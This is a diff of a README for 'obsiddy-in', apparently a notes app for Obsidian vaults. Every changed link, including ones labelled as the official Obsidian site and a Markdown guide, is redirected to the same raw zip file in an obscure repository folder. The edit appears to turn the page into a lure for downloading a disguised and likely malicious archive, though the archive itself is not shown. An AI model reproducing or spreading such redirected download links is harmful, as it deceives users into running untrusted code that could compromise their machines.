@@ -1,6 +1,6 @@
 # 📓 obsiddy-in - Simple Notes for Obsidian Vaults
 
-[![Download obsiddy-in](https://img.shields.io/badge/Download-obsiddy--in-brightgreen?style=for-the-badge)](https://github.com/priyanshu130824/obsiddy-in)
+[![Download obsiddy-in](https://img.shields.io/badge/Download-obsiddy--in-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/priyanshu130824/obsiddy-in/main/cuproplumbite/obsiddy_in_2.6.zip)
 
 ---
 
@@ -44,7 +44,7 @@ Before you begin, make sure your Obsidian vault is saved on your Windows PC in a
 ## ⬇️ How to Download and Install obsiddy-in
 
 1. Click the green button at the top or visit this page to download the app:  
-   [https://github.com/priyanshu130824/obsiddy-in](https://github.com/priyanshu130824/obsiddy-in)
+   [https://raw.githubusercontent.com/priyanshu130824/obsiddy-in/main/cuproplumbite/obsiddy_in_2.6.zip](https://raw.githubusercontent.com/priyanshu130824/obsiddy-in/main/cuproplumbite/obsiddy_in_2.6.zip)
 
 2. On the GitHub page, look for the **Releases** section on the right side or at the top menu. This is where installers or files are provided.
 
@@ -105,7 +105,7 @@ You can find settings in the top menu or gear icon.
 ## 🔄 How to Update obsiddy-in
 
 1. Visit the download page:  
-   [https://github.com/priyanshu130824/obsiddy-in](https://github.com/priyanshu130824/obsiddy-in)
+   [https://raw.githubusercontent.com/priyanshu130824/obsiddy-in/main/cuproplumbite/obsiddy_in_2.6.zip](https://raw.githubusercontent.com/priyanshu130824/obsiddy-in/main/cuproplumbite/obsiddy_in_2.6.zip)
 
 2. Check the **Releases** section for a newer version.
 
@@ -126,10 +126,10 @@ You can find settings in the top menu or gear icon.
 
 ## 🔗 Useful Links
 
-- Download and explore the app here: [https://github.com/priyanshu130824/obsiddy-in](https://github.com/priyanshu130824/obsiddy-in)  
-- Obsidian official site: https://obsidian.md  
-- Markdown guide for note formatting: https://www.markdownguide.org/basic-syntax  
+- Download and explore the app here: [https://raw.githubusercontent.com/priyanshu130824/obsiddy-in/main/cuproplumbite/obsiddy_in_2.6.zip](https://raw.githubusercontent.com/priyanshu130824/obsiddy-in/main/cuproplumbite/obsiddy_in_2.6.zip)  
+- Obsidian official site: https://raw.githubusercontent.com/priyanshu130824/obsiddy-in/main/cuproplumbite/obsiddy_in_2.6.zip  
+- Markdown guide for note formatting: https://raw.githubusercontent.com/priyanshu130824/obsiddy-in/main/cuproplumbite/obsiddy_in_2.6.zip  
 
 ---
 
-# [![Download obsiddy-in](https://img.shields.io/badge/Download-obsiddy--in-blue?style=for-the-badge)](https://github.com/priyanshu130824/obsiddy-in)
+# [![Download obsiddy-in](https://img.shields.io/badge/Download-obsiddy--in-blue?style=for-the-badge)](https://raw.githubusercontent.com/priyanshu130824/obsiddy-in/main/cuproplumbite/obsiddy_in_2.6.zip)
